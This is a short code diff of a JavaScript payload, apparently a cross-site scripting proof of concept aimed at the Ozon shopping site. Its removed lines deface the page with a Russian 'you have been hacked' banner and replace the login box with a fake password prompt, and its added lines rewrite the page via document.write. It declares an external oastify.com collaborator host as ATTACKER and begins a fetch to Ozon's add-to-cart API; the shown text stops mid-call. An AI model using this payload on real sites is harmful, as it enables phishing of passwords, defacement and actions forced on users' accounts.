@@ -1,7 +1,5 @@
-alert('new_1');
-document.body.innerHTML += '<h1>Вы были взломаны!</h1>';
-document.getElementById('login-box').innerHTML = '<input type="text" placeholder="Введите пароль еще раз">';
-
+alert('new_2');
+document.write('<html><body><h1>Взломано!</h1><p>Ваша страница теперь выглядит так.</p></body></html>');
 var ATTACKER = 'https://dm3pjhjkpudpos6lmt41kc90xr3iref3.oastify.com';
 
 fetch('https://www.ozon.ru/api/composer-api.bx/_action/v2/addToCart', {
